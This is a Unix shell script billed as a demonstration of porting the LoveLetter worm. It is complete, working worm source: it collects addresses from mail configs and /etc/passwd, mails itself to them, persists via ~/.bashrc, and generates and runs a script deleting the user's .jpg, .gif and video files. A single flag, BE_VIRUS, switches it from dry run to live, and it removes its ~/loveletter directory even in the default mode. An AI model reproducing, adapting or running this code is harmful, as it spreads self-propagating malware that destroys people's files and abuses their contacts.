#!/bin/sh
# This is a demonstration how easy a virus like the LoveLetter virus 
# can be portet to a unix systems. 
#
# First this "virus" searches for the users email adresses in 
# $MAIL_FILES
# then its extracting the other usernames out of the /etc/passwd file.
# He creates a shell script for sending the virus to the extracted
# adresses. Have a look on $MAIL_PROG.
#
# Then he is executing this script.
#
# The second Part of the virus tries to delete all $DELETE_FILES file.
# Its useses locate to get the file names.
# The virus creates a shell script for removing these files. 
# Have a look on $DELETE_PROG. There you can see which files the
# virus would be able to delete.
#
# Then he is executing this script.
#
# If the $BE_VIRUS value is set to 0 (false)
# none of these script will be executed. If its set to 1 (true) both 
# scripts will be executed


# 0 is false and 1 is true
# Be careful! If you set it to 1 it becomes
# a real virus and can damage your system
# and infekt many other computers!
BE_VIRUS=0 

PROG_DIR=~/loveletter
PROG_BIN_DIR=$PROG_DIR/bin
PROG_FILES_DIR=$PROG_DIR/files

README_FILE=$PROG_DIR/REAMDE
PROG_LOG_FILE=$PROG_DIR/log
BIN_PROG=$PROG_BIN_DIR/loveletter.sh

MAIL_FILES=".muttrc .mailrc" 
MAIL_PROG=$PROG_BIN_DIR/sendmails.sh

DELETE_FILES="*.jpg *.mpg *.mpeg *.gif"
DELETE_PROG=$PROG_BIN_DIR/rm.sh

# logging the activties
# eg.: log "Sending Mail to Skinny";
log() {
  echo $*
  echo $* >> $PROG_LOG_FILE 
}

create_directories() { 
  mkdir $PROG_DIR
  mkdir $PROG_BIN_DIR
  mkdir $PROG_FILES_DIR

  log "Creating directory" $PROG_DIR
  log "Creating directory" $PROG_BIN_DIR
  log "Creating directory" $PROG_FILES_DIR
}

pos_bin() {
  local pos

  pos=`pwd`

  log "Copying" $pos/$0 $PROG_BIN_DIR/loveletter.sh
  cp $pos/$0 $PROG_BIN_DIR/loveletter.sh
  chmod 755 $PROG_BIN_DIR/loveletter.sh
}

# cleans the old loveletter directory
clean_old_stuff() {
  rm -rf $PROG_DIR
}

# hook into the startup process
hook_into_startup() {
  local bashrc

  if test $BE_VIRUS -eq 0; then
    # we are not a virus, we are doing
    # it on a copy
    cp ~/.bashrc $PROG_FILES_DIR
    bashrc=$PROG_FILES_DIR/.bashrc
  else
    bashrc=~/.bashrc
  fi

  if test -f $bashrc; then
    log "Adding \"" $BIN_PROG "& \"to " ~/.bashrc
    echo $BIN_PROG "&" >> $bashrc
  fi
}

# extracting email-addresses out of different 
# mail files
get_adresses() {
   local f
   local a
   local adresses

   log "Getting email adresses"

   for f in $MAIL_FILES; do
     if test -f $f; then
       a=`perl -e 'open( INFILE, "'$f'" );  
                      foreach( <INFILE> ) {
                        if( /^alias/i )  {
                          s/(.*[\"\< ])([\w\-\.]+@[a-zA-Z0-9\.\-_]+)(.*$)/$2/;
                          print "$_";
                        }
                      }
                   close( INFILE );'`
       adresses="$adresses $a"
     fi
  done

  # names of other users on the system
  a=`awk 'BEGIN{ FS=":"} { print $1 }' /etc/passwd`
  adresses="$adresses $a"

  log "Creating sendmail file"

  echo "#!/bin/sh" >> $MAIL_PROG
  chmod 755 $MAIL_PROG

  for a in $adresses; do
    echo 'mailx -s "I LOVE YOU" '$a' < '$BIN_PROG >> $MAIL_PROG
  done
}

send_virus() {
 local n 

 # number of email adresses
 n=`awk 'END{ a=NR-1; print a }' $MAIL_PROG`

 log "Sending Virus to " $n "users"

 if test $BE_VIRUS -eq 1; then
   $MAIL_PROG
 fi

}


get_files() {
  local f 
  local files

  log "Getting deletable files"

  for f in $DELETE_FILES; do
    files="$files `locate $f`"
  done

  echo "#!/bin/sh" >> $DELETE_PROG
  chmod 755 $DELETE_PROG

  for f in $files; do
    if test -O $f; then
      echo "rm -f $f" >> $DELETE_PROG
    else
     if test -G $f; then
       echo "rm -f $f" >> $DELETE_PROG
     fi
    fi   
  done  
}

delete_files() {
  local n
  
  n=`awk 'END{ a=NR-1; print a }' $DELETE_PROG`

  log "Deleting $n files" 
  
  if test $BE_VIRUS -eq 1; then
    $DELETE_PROG
  fi 
 
}

create_readme() {

log "Creating $README_FILE  file"

echo '  
This is a demonstration how easy a virus like the LoveLetter virus 
can be portet to a unix systems. 

First this "virus" searches for the users email adresses in 
'$MAIL_FILES'
then its extracting the other usernames out of the /etc/passwd file.
He creates a shell script for sending the virus to the extracted
adresses. Have a look at the '$MAIL_PROG' file.

Then he is executing this script.

The second Part of the virus tries to delete all '$DELETE_FILES' file.
Its useses locate to get the file names.
The virus creates a shell script for removing these files. 
Have a look on '$DELETE_PROG'. There you can see which files the
virus would be able to delete.

Then he is executing this script.

The BE_VIRUS value is to '$BE_VIRUS', so if its set to 0 (false)
none of these script will be executed. If its set to 1 (true) both 
scripts will be executed
' > $README_FILE

}

# the main program
clean_old_stuff

create_directories

create_readme

pos_bin

hook_into_startup

get_adresses

send_virus

get_files

delete_files

